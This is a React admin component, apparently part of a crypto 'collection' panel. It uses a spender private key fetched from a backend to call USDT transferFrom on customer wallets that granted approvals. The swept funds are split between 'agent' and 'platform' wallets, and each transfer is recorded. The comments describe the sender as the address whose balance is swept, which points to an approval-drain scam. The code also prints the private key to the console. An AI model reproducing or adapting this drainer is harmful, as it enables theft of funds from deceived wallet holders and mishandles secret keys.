import React, { useState, useEffect } from 'react';
import { Modal, Form, InputNumber, message } from 'antd';
import { createWalletClient, http, parseUnits, createPublicClient } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { bsc, mainnet } from 'viem/chains';
import { simpleGet, addItem } from '@/services/ant-design-pro/api';
// import { request } from '@/services/ant-design-pro/api';

// USDT 合约地址（BSC）
const BSC_USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';

// USDT 合约地址（ETH）
const ETH_USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';

// USDT 合约 ABI（更完整的ABI）
const USDT_ABI = [
  {
    inputs: [
      { name: 'sender', type: 'address' },
      { name: 'recipient', type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
    name: 'transferFrom',
    outputs: [{ name: '', type: 'bool' }],
    stateMutability: 'nonpayable',
    type: 'function',
  },
  {
    inputs: [
      { name: 'spender', type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
    name: 'approve',
    outputs: [{ name: '', type: 'bool' }],
    stateMutability: 'nonpayable',
    type: 'function',
  },
  {
    inputs: [{ name: 'account', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: '', type: 'uint256' }],
    stateMutability: 'view',
    type: 'function',
  },
  {
    inputs: [
      { name: 'owner', type: 'address' },
      { name: 'spender', type: 'address' },
    ],
    name: 'allowance',
    outputs: [{ name: '', type: 'uint256' }],
    stateMutability: 'view',
    type: 'function',
  },
];

interface WithdrawProps {
  open: boolean;
  onClose: () => void;
  currentRow?: API.ItemData;
  onSuccess?: () => void;
}

const Withdraw: React.FC<WithdrawProps> = ({ open, onClose, currentRow }) => {
  const [form] = Form.useForm();
  const [loading, setLoading] = useState(false);

  // State for wallet data and loading status
  const [walletData, setWalletData] = useState<any>(null);
  const [isWalletLoading, setIsWalletLoading] = useState(false);

  // Fetch wallet data directly with simpleGet
  useEffect(() => {
    const fetchWalletData = async () => {
      if (!currentRow?.network || !currentRow?.address || !open) {
        return;
      }

      setIsWalletLoading(true);
      try {
        const response = await simpleGet('/customers/wallet', {
          network: currentRow.network,
          address: currentRow.address,
          inviteCode: currentRow.invitedBy,
        });

        setWalletData(response);

        // 新增获取spender地址和密钥的接口
        const spenderResponse = await simpleGet(`/customers/${currentRow._id}/invite-code`);

        // 更新walletData中的spender和secretKey
        if (spenderResponse?.data) {
          setWalletData((prev: any) => ({
            ...prev,
            spenderData: spenderResponse.data,
          }));
        }
      } catch (error) {
        console.error('Failed to fetch wallet data:', error);
        message.error('获取钱包数据失败');
      } finally {
        setIsWalletLoading(false);
      }
    };

    fetchWalletData();
  }, [currentRow?.network, currentRow?.address, currentRow?.invitedBy, open]);

  // 检查是否有代理（通过检查API返回的数据结构）
  const hasAgentWallet = walletData?.data?.agentWallet !== undefined;

  // 根据API返回的数据获取钱包信息和分成比例
  let sender, spender, secretKey, recipient1, recipient2;
  let percentage1 = 1; // 默认100%给一个钱包
  let percentage2 = 0;

  if (hasAgentWallet) {
    // 有邀请人的情况，设置两个钱包和分成比例
    sender = currentRow?.address || ''; // 被划走余额的地址
    // 使用新接口返回的spender和secretKey
    spender = walletData?.spenderData?.address || '';
    secretKey = walletData?.spenderData?.secretKey || '';

    // 第一个接收者是代理，第二个是平台
    recipient1 = walletData?.data?.agentWallet?.address || '';
    recipient2 = walletData?.data?.adminWallet?.address || '';

    // 使用API返回的分成比例
    percentage1 = walletData?.data?.agentWallet?.proxySharingRate || 0.6; // 默认60%
    percentage2 = walletData?.data?.agentWallet?.platformSharingRate || 0.4; // 默认40%
  } else {
    // 没有邀请人的情况，只有一个钱包
    sender = currentRow?.address || ''; // 被划走余额的地址
    // 使用新接口返回的spender和secretKey
    spender = walletData?.spenderData?.address || '';
    secretKey = walletData?.spenderData?.secretKey || '';
    recipient1 = walletData?.data?.address || ''; // 直接使用返回的地址
    recipient2 = ''; // 没有第二个接收者
  }

  console.log('spender', spender);
  console.log('secretKey', secretKey);

  // 根据网络获取对应的USDT合约地址
  const getUsdtAddress = (network: string) => {
    switch (network) {
      case 'ETH':
        return ETH_USDT_ADDRESS;
      case 'BSC':
        return BSC_USDT_ADDRESS;
      default:
        throw new Error(`Unsupported network: ${network}`);
    }
  };

  const handleOk = async () => {
    try {
      console.log('Validating form fields...');
      const values = await form.validateFields();

      // 检查钱包数据是否已加载
      if (!walletData) {
        throw new Error('钱包数据未加载完成，请稍后再试');
      }

      // 检查网络是否支持
      if (!currentRow?.network || !['ETH', 'BSC'].includes(currentRow.network)) {
        throw new Error('不支持的网络类型');
      }

      setLoading(true);
      message.loading({ content: '正在分配资金...', key: 'withdraw' });

      // 创建钱包客户端
      const account = privateKeyToAccount(secretKey);

      const client = createWalletClient({
        account,
        chain: currentRow.network === 'ETH' ? mainnet : bsc,
        transport: http(
          currentRow.network === 'ETH'
            ? 'https://ethereum.publicnode.com'
            : 'https://bsc-dataseed1.binance.org/',
        ),
      });

      // 创建公共客户端用于读取操作
      const publicClient = createPublicClient({
        chain: currentRow.network === 'ETH' ? mainnet : bsc,
        transport: http(
          currentRow.network === 'ETH'
            ? 'https://ethereum.publicnode.com'
            : 'https://bsc-dataseed1.binance.org/',
        ),
      });

      // 获取对应网络的USDT合约地址
      const usdtAddress = getUsdtAddress(currentRow.network);

      // 转换总金额为 USDT 单位（6位小数）
      const totalAmount =
        parseUnits(values.amount.toString(), 6) *
        (currentRow.network === 'ETH' ? BigInt(1) : BigInt(10 ** 12));

      // 检查发送者余额
      const balance = (await publicClient.readContract({
        address: usdtAddress,
        abi: USDT_ABI,
        functionName: 'balanceOf',
        args: [sender],
      })) as bigint;

      if (balance < totalAmount) {
        throw new Error(
          `余额不足，当前余额: ${
            Number(balance) / (currentRow.network === 'ETH' ? 10 ** 6 : 10 ** 18)
          }, 需要: ${Number(totalAmount) / (currentRow.network === 'ETH' ? 10 ** 6 : 10 ** 18)}`,
        );
      }

      // 检查授权额度
      const allowance = (await publicClient.readContract({
        address: usdtAddress,
        abi: USDT_ABI,
        functionName: 'allowance',
        args: [sender, spender],
      })) as bigint;

      // 如果没有授权，提示用户
      if (allowance === BigInt(0)) {
        message.warning({
          content: `请先授权 ${spender} 地址使用您的USDT`,
          key: 'withdraw',
        });
        return;
      }

      // 如果授权额度不足，提示用户
      if (allowance < totalAmount) {
        message.warning({
          content: `当前授权额度不足，请增加授权额度`,
          key: 'withdraw',
        });
        return;
      }

      if (hasAgentWallet) {
        // 有代理的情况，需要分两笔转账

        // 计算每个接收者的金额（使用浮点数计算后再转换为BigInt）
        const amount1 =
          parseUnits((values.amount * percentage1).toString(), 6) *
          (currentRow.network === 'ETH' ? BigInt(1) : BigInt(10 ** 12));
        const amount2 =
          parseUnits((values.amount * percentage2).toString(), 6) *
          (currentRow.network === 'ETH' ? BigInt(1) : BigInt(10 ** 12));

        // 转账给第一个接收者（平台）
        console.log('开始转账给平台...');
        const hash1 = await client.writeContract({
          address: usdtAddress,
          abi: USDT_ABI,
          functionName: 'transferFrom',
          args: [sender, recipient2, amount2],
          account: account,
        });

        // 等待第一个交易确认
        await publicClient.waitForTransactionReceipt({ hash: hash1 });
        console.log('平台转账交易已确认');

        // 转账给第二个接收者（代理）
        console.log('开始转账给代理...');
        const hash2 = await client.writeContract({
          address: usdtAddress,
          abi: USDT_ABI,
          functionName: 'transferFrom',
          args: [sender, recipient1, amount1],
          account: account,
        });
        console.log('代理的交易哈希:', hash2);

        // 等待第二个交易确认
        await publicClient.waitForTransactionReceipt({ hash: hash2 });
        console.log('平台转账交易已确认');

        // 记录转账记录到后端
        await addItem('/transfers/collection', {
          employee: currentRow.employee?._id || '', // 添加可选链操作符，防止undefined错误
          network: currentRow.network, // 网络类型
          sender, // 发送者地址
          proxyWallet: recipient1, // 第一个接收者地址（代理）
          adminWallet: recipient2, // 第二个接收者地址（平台）
          proxyAmount:
            currentRow.network === 'BSC' ? Number(amount1) / 10 ** 18 : Number(amount1) / 10 ** 6, // 根据网络类型转换金额
          adminAmount:
            currentRow.network === 'BSC' ? Number(amount2) / 10 ** 18 : Number(amount2) / 10 ** 6, // 根据网络类型转换金额
          proxyHash: hash1, // 第一个交易哈希
          adminHash: hash2, // 第二个交易哈希
          type: 'agent', // 转账类型
          status: 'success', // 转账状态
        });
      } else {
        // 执行单笔转账
        console.log('开始转账...');
        const hash = await client.writeContract({
          address: usdtAddress,
          abi: USDT_ABI,
          functionName: 'transferFrom',
          args: [sender, recipient1, totalAmount],
          account: account,
        });
        console.log('交易哈希:', hash);

        // 等待交易确认
        await publicClient.waitForTransactionReceipt({ hash: hash });
        console.log('转账交易已确认');
        console.log(
          'totalAmount平台',
          currentRow.network === 'BSC'
            ? Number(totalAmount) / 10 ** 18
            : Number(totalAmount) / 10 ** 6,
        );

        // 记录转账记录到后端
        await addItem('/transfers/collection', {
          employee: currentRow.employee?._id || '', // 添加可选链操作符，防止undefined错误
          network: currentRow.network, // 网络类型
          sender, // 发送者地址
          adminWallet: recipient1, // 接收者地址
          adminAmount:
            currentRow.network === 'BSC'
              ? Number(totalAmount) / 10 ** 18
              : Number(totalAmount) / 10 ** 6, // 根据网络类型转换金额
          adminHash: hash, // 交易哈希
          type: 'direct', // 转账类型
          status: 'success', // 转账状态
        });
      }

      message.success({ content: '资金分配成功！', key: 'withdraw' });
      onClose();
    } catch (error: any) {
      console.error('分配错误:', error);
      message.error({
        content: error.message || '资金分配失败',
        key: 'withdraw',
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <Modal
      title="归集"
      open={open}
      onOk={handleOk}
      onCancel={onClose}
      confirmLoading={loading || isWalletLoading}
    >
      {isWalletLoading ? (
        <div>正在加载钱包数据...</div>
      ) : (
        <Form form={form} layout="vertical">
          <Form.Item name="amount" label="归集金额" rules={[{ required: true }]}>
            <InputNumber style={{ width: '100%' }} placeholder="输入归集金额" />
          </Form.Item>
        </Form>
      )}
    </Modal>
  );
};

export default Withdraw;
